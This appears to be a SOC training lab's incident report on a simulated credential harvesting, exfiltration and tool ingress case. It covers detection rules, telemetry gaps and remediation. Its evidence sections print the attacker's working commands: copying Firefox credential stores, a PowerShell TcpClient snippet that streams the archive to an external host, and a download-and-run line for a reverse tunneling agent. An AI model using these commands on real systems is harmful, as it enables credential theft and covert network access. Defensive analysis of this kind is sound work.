# Case 003 — Credential Harvesting, Data Staging & Tool Ingress Investigation

## 1. Case Summary
Following host reconnaissance (Case 002), the adversary on workstation `IT-ADMIN01` (`10.10.35.18`) sought administrative credentials to enable lateral movement. ArcSight ESM triggered a sequence of High-Severity alerts: `SOC-LAB A06 Credential Material Collection` (Severity 8), `SOC-LAB A07 Suspicious Data Staging / Raw Transfer` (Severity 8), and `SOC-LAB A08 Suspicious Tool Transfer or Execution` (Severity 7).

Tier-2 SOC analysts leveraged ArcSight Logger to correlate Microsoft Sysmon (Event ID 1 & 3) and PowerShell ScriptBlock Logging (Event ID 4104). The investigation revealed that the attacker harvested the user's Mozilla Firefox browser profile using `xcopy.exe`, compressed the directory with `Compress-Archive`, streamed the raw bytes to external listener `203.0.113.25:9999` using a raw .NET TCP socket, and downloaded an ingress proxy utility (`agent.exe`). This case emphasizes the critical distinction between **credential material collection** (directly observed) and **credential compromise** (inferred), as offline cryptographic decryption generates zero telemetry on internal systems.

---

## 2. Investigation Objective
1. Investigate the source, parameters, and targets of the `xcopy.exe` execution flagged by rule `A06`.
2. Trace the data staging lifecycle: determine whether sensitive browser databases were archived and moved across file system boundaries.
3. Validate whether data was transmitted outside the enterprise boundary and identify the network transport mechanism (`A07`).
4. Reconstruct the tool ingress pipeline: determine the purpose of `agent.exe` downloaded under rule `A08`.
5. Clearly delineate between directly observed telemetry facts and analytic inferences regarding credential recovery.

---

## 3. Initial Alert
* **Alert Trigger**: `SOC-LAB A06 Credential Material Collection`
* **Detection Engine**: ArcSight ESM Real-Time Rules Engine
* **Severity**: `8 / 10 (High)`
* **Timestamp**: $T_0 + 6\text{m } 12\text{s}$
* **Affected Asset**: `10.10.35.18` (`IT-ADMIN01`, Internal Network)
* **Alert Logic**: Sysmon Event ID 1 matching process `xcopy.exe` targeting Mozilla Firefox profile directories containing SQLite credential stores (`logins.json`, `key4.db`).

---

## 4. Initial Evidence
* **Process Execution Telemetry**:
  * Binary: `C:\Windows\System32\xcopy.exe`
  * Command Line:
    ```cmd
    xcopy /E /I /Y "C:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\waut035y.default-release" "C:\Users\Public\firefox_profile\"
    ```
  * User Context: `IT-ADMIN\admin`
  * Parent Process: Malicious reverse shell `powershell.exe` (`ProcessGuid = {ecec360d-d720-6aab-3600-000000001800}`).

---

## 5. Investigation Hypotheses

| Hypothesis ID | Formulation | Validation Status | Evidence Base |
| :--- | :--- | :---: | :--- |
| **H1** | The adversary targeted browser credential stores to circumvent the passphrase-protected SSH key found in Case 002. | **SUPPORTED** | Chronological alignment: SSH config check ($T+4\text{m}$) directly followed by Firefox staging ($T+6\text{m}$). |
| **H2** | Staged browser files were packaged and exfiltrated over an unencrypted network socket. | **SUPPORTED** | PowerShell ScriptBlock 4104 confirms `Compress-Archive` and `.NET TcpClient` streaming to `203.0.113.25:9999`. |
| **H3** | The downloaded binary `agent.exe` represents an external tunneling agent (Ligolo-ng). | **SUPPORTED** | Sysmon ID 1 & PowerShell 4104 confirm `Invoke-WebRequest` of `agent.exe` from `203.0.113.25:8080`. |
| **H4** | Internal telemetry directly records the plaintext credentials decrypted by the attacker. | **NOT SUPPORTED / UNVERIFIED** | Decryption occurred offline on Kali (`firefox_decrypt`); internal telemetry only observes encrypted profile transfer. |

---

## 6. Investigation Method
1. **Host Staging Tracking**: Query Sysmon Event ID 11 (FileCreate) and Event ID 1 to verify destination paths and permissions on `C:\Users\Public\`.
2. **ScriptBlock Telemetry Inspection**: Execute Logger queries for PowerShell Event ID 4104 on `IT-ADMIN01` to capture in-memory script blocks executed during the staging phase.
3. **Network Flow Verification**: Cross-reference script socket parameters with pfSense firewall logs and Zeek `conn.log` on port 9999.
4. **Ingress Tool Identification**: Analyze the URI, hash, and destination path of binaries downloaded under rule `A08`.

---

## 7. Evidence Pivot 1: Staging Directory & File Compression (`A06` & `A07`)
* **Objective**: Determine how the copied Firefox profile files were packaged for extraction.
* **Logger Query (PowerShell ScriptBlock)**:
  ```text
  deviceProduct="Microsoft-Windows-PowerShell" AND externalId=4104 AND message CONTAINS "Compress-Archive"
  ```
* **Observed Artifacts**:
  At $T_0 + 6\text{m } 45\text{s}$, PowerShell ScriptBlock Logging captured the execution of:
  ```powershell
  Compress-Archive -Path "C:\Users\Public\firefox_profile\*" -DestinationPath "C:\Users\Public\firefox_profile.zip" -Force
  ```
* **Analytic Conclusion**: The adversary consolidated hundreds of individual browser cache, cookie, and SQLite database files into a single compressed transport archive (`firefox_profile.zip`) within the world-writable `C:\Users\Public\` staging folder.

---

## 8. Evidence Pivot 2: Raw Network Socket Exfiltration (`A07`)
* **Objective**: Identify the delivery mechanism used to move `firefox_profile.zip` off the workstation.
* **Logger Query**:
  ```text
  deviceProduct="Microsoft-Windows-PowerShell" AND externalId=4104 AND message CONTAINS "TcpClient"
  ```
* **Observed Artifacts**:
  At $T_0 + 7\text{m } 10\text{s}$, PowerShell ScriptBlock Logging recorded:
  ```powershell
  $client = New-Object System.Net.Sockets.TcpClient("203.0.113.25", 9999);
  $stream = $client.GetStream();
  $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\firefox_profile.zip");
  $stream.Write($bytes, 0, $bytes.Length);
  $stream.Close(); $client.Close();
  ```
* **Zeek NDR Cross-Verification**:
  ```text
  deviceProduct="Zeek" AND transportProtocol="TCP" AND destinationPort=9999 AND sourceAddress=10.10.35.18
  ```
* **Result**:
  Zeek `conn.log` confirms an outbound TCP connection from `10.10.35.18:49215` to `203.0.113.25:9999` with `duration = 4.2s` and `orig_bytes = 1,482,109` (~1.48 MB, exactly matching the size of `firefox_profile.zip`).
* **Analytic Conclusion**: The attacker bypassed high-level web browsers and HTTP proxies by writing raw binary bytes directly over an unencrypted raw TCP socket to an ad-hoc Netcat listener on Kali.

---

## 9. Evidence Pivot 3: Tool Ingress (`agent.exe` — `A08`)
* **Objective**: Analyze the subsequent tool download flagged by rule `A08`.
* **Logger Query**:
  ```text
  deviceProduct="Microsoft-Windows-PowerShell" AND externalId=4104 AND message CONTAINS "Invoke-WebRequest"
  ```
* **Observed Artifacts**:
  At $T_0 + 8\text{m } 20\text{s}$, PowerShell ScriptBlock Logging captured:
  ```powershell
  Invoke-WebRequest -Uri "http://203.0.113.25:8080/agent.exe" -OutFile "C:\Users\Public\agent.exe"
  ```
* **Sysmon Process Creation Validation**:
  Sysmon Event ID 1 confirms `agent.exe` was written to disk and executed with command-line arguments:
  ```cmd
  C:\Users\Public\agent.exe -connect 203.0.113.25:11601 -ignore-cert
  ```
* **Analytic Conclusion**: The attacker deployed **Ligolo-ng**, an advanced multiplexed reverse tunneling agent, configuring it to connect back to the proxy controller on `203.0.113.25:11601`. This effectively transformed `IT-ADMIN01` into an internal routing bridge for lateral movement (investigated in Case 004).

---

## 10. Timeline of Events

```text
[T0 + 6m 12s]  SYSMON: xcopy.exe copies Firefox profile to C:\Users\Public\firefox_profile\ (Rule A06 fires).
[T0 + 6m 45s]  POWERSHELL: ScriptBlock 4104 executes Compress-Archive producing firefox_profile.zip.
[T0 + 7m 10s]  POWERSHELL: ScriptBlock 4104 executes System.Net.Sockets.TcpClient connecting to 203.0.113.25:9999.
[T0 + 7m 12s]  ZEEK: conn.log records 1.48 MB TCP stream on port 9999 (Rule A07 fires).
[T0 + 8m 20s]  POWERSHELL: Invoke-WebRequest downloads agent.exe from 203.0.113.25:8080 (Rule A08 fires).
[T0 + 8m 45s]  SYSMON: agent.exe executed with arguments -connect 203.0.113.25:11601 -ignore-cert.
```

---

## 11. Reconstructed Attack Chain
```text
1. Credential Scraping   ──► xcopy.exe (Firefox Profiles ──► C:\Users\Public\firefox_profile\)
2. Data Staging          ──► PowerShell Compress-Archive (firefox_profile.zip)
3. Raw Socket Exfil      ──► .NET TcpClient ──► 203.0.113.25:9999 (1.48 MB transferred)
4. Offline Cryptanalysis ──► Attacker runs firefox_decrypt on Kali (UNVERIFIED on internal telemetry)
5. Ingress Tool Transfer ──► Invoke-WebRequest ──► C:\Users\Public\agent.exe
6. Foothold Weaponization──► agent.exe connects to 203.0.113.25:11601 (Ligolo-ng Tunnel)
```

---

## 12. Detection Coverage Analysis

| Detection ID | Fired? | Evidence Found | Operational Role in Investigation | Known Detection Limitations |
| :--- | :---: | :--- | :--- | :--- |
| **A06** | **YES** | Sysmon Event 1 (`xcopy.exe` Firefox profile) | Alert Trigger: Signals browser credential theft | Specific to Firefox path; blind to Chrome/Edge unless path regex updated |
| **A07** | **YES** | PowerShell 4104 (`Compress-Archive`, `TcpClient`) | Staging/Exfil Anchor: Reveals archive creation & socket | Dependent on PowerShell ScriptBlock logging enabled via GPO |
| **A08** | **YES** | PowerShell 4104 / Sysmon 1 (`agent.exe` download/exec) | Ingress Tool Pivot: Identifies tunneling agent | Matches binary string `agent.exe`; bypassed if attacker renames binary |

---

## 13. Detection Gaps & Evidentiary Boundaries
1. **The Offline Cryptanalysis Blind Spot**:
   * *Critical Distinction*: Telemetry directly proves **Credential Material Collection** (`E20`, `E21`, `E22`).
   * *Evidentiary Limitation*: Telemetry **cannot prove** that passwords were successfully recovered until the adversary attempts to use them in later phases. The decryption of master keys (`key4.db`) using `firefox_decrypt` occurred entirely on the attacker's Kali machine. Declaring "credentials were compromised" during this phase is an **analytic inference**, not a directly logged fact.
2. **Raw Socket Transport Obfuscation**:
   * Standard network intrusion signatures look for HTTP/HTTPS headers. By utilizing a raw .NET TCP socket on port 9999, the adversary evaded standard Web Application and URL filtering gateways, requiring flow-level inspection (`Zeek`) to detect.

---

## 14. Impact Assessment
* **Confidentiality**: **CRITICAL RISK**. Administrative browser credentials (passwords, session cookies, auth tokens) exported outside the perimeter.
* **Integrity**: **HIGH RISK**. Arbitrary untrusted binary (`agent.exe`) introduced and executed in world-writable directory `C:\Users\Public\`.
* **Availability**: **NORMAL**.
* **Operational Shift**: The intrusion transitioned from a simple interactive shell on a single endpoint to an active internal pivot bridge capable of proxying arbitrary network traffic into the enterprise core.

---

## 15. Containment & Remediation Actions
1. **Directory ACL Hardening**: Removed write and execute permissions for standard users on `C:\Users\Public\`.
2. **Credential Revocation**: Enforced enterprise-wide password resets for user `thanh` and all accounts managed from `IT-ADMIN01`.
3. **Firewall Egress Enforcement**: Updated pfSense firewall to enforce default-deny egress policies on high ports (9999, 11601, 8080).
4. **Tool Purge**: Terminated `agent.exe` process and deleted `C:\Users\Public\agent.exe` and `firefox_profile.zip`.

---

## 16. Lessons Learned
1. **Public Folders as Staging Grounds**: Attackers consistently favor `C:\Users\Public\` because default Windows ACLs grant standard users write permissions, making it an ideal staging directory for LOLBins.
2. **ScriptBlock Logging is Indispensable**: If PowerShell ScriptBlock Logging (Event ID 4104) had been disabled, the socket-based data transfer and file compression would have been completely invisible from endpoint telemetry.

---

## 17. Detection Improvements
1. **Public Directory Execution Blocking**: Implement Software Restriction Policies (SRP) or AppLocker rules preventing binary execution from `C:\Users\Public\*.exe`.
2. **Generalize Rule A06**: Broaden `A06` logic to detect `xcopy`, `robocopy`, or `tar` targeting Chromium, Edge, and Brave profile locations (`AppData\Local\Google\Chrome\User Data\Default`).
3. **Outbound Port Anomaly Alerts**: Create an ESM threshold alert for internal workstations initiating outbound connections to non-standard TCP ports ($> 1024$) without traversing the corporate proxy.

---

## 18. Investigation Limitations
* Direct confirmation of the plaintext credentials was only achieved retroactively when the attacker utilized the password for user `thanh` in Case 004.

---

## 19. Final Assessment
Case 003 documents the successful theft of browser credential material and the deployment of a proxy tunneling agent on `IT-ADMIN01`. High-fidelity endpoint telemetry (Sysmon and PowerShell 4104) captured every phase of staging and raw socket transfer, providing conclusive proof of data exfiltration and tool staging.

---

## 20. Evidence References
* **Primary Report**: `Báo cáo đề tài SOC.pdf`, Trang 82–84, 95–97, 126–128.
* **Architecture Runbook**: `toan-bo-he-thong-kien_truc_lab.txt`, Mục 51–52.
* **Logger Evidence Artifacts**: EV-04, EV-05, EV-06.

---

## 21. Related Visual & Evidentiary Assets

### Architecture & Forensic Workflow Diagrams
* [**Enterprise SOC Overview Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/enterprise-soc-overview.svg): High-level system architecture and endpoint monitoring layout.
* [**Telemetry Pipeline Flow Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/telemetry-flow.svg): Windows Event Forwarding (Sysmon + PowerShell) into ArcSight SmartConnector.
* [**Detection Dependency Flow Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/detection-flow.svg): Detection rules `A07`, `A08`, and `A09` correlation structure.
* [**Case 003 Forensic Investigation Flowchart**](file:///e:/project_ca_nhan/lab_cty/investigation/case-003/investigation-flow.mmd): Sequence diagram of ScriptBlock decompression, socket egress, and tool ingress.

### Curated Evidence Manifests
* [**INV-004 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/investigation/README.md#inv-004): PowerShell ScriptBlock 4104 decompression and raw TCP socket exfiltration stream (`TCP:11601`).
* [**TEL-001 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/telemetry/README.md#tel-001): Microsoft Sysmon endpoint telemetry configuration (Process Create & File Create rules).
* [**TEL-002 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/telemetry/README.md#tel-002): Microsoft Windows PowerShell ScriptBlock Logging (Event ID 4104) schema and configuration.

### Demonstration & Investigation Videos
* [**VIDEO-01: Attack Simulation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/attack-simulation/VIDEO-01.md): Red-team execution of Chrome credential harvesting, raw socket transfer, and certutil tool staging.
* [**VIDEO-02: Full Incident Investigation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-02-FULL.md): Primary screen recording of incident triage, Sysmon process tree extraction, and C2 callback investigation.
* [**VIDEO-03: Supplementary Investigation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-03-SUPPLEMENT.md): Technical deep-dive on Module 1: PowerShell ScriptBlock 4104 decoding and raw socket exfiltration analysis.

---

## 22. Video Demonstration

* **Hosting:** YouTube  
* **Visibility:** Unlisted  
* **Status:** Pending Upload  
* **URL:** `YOUTUBE_URL_PENDING`  
* **Demonstration Documents:**
  * Primary Walkthrough: [**`VIDEO-02-FULL.md`**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-02-FULL.md)
  * Deep Forensics Companion: [**`VIDEO-03-SUPPLEMENT.md`**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-03-SUPPLEMENT.md)

Under the unified laboratory incident workflow, this case study's triage is demonstrated within **Video 02** (Full Incident Investigation Walkthrough), while **Video 03** (Supplementary Walkthrough) delivers the specialized deep-dive into PowerShell ScriptBlock 4104 decompression and raw TCP socket exfiltration analysis.


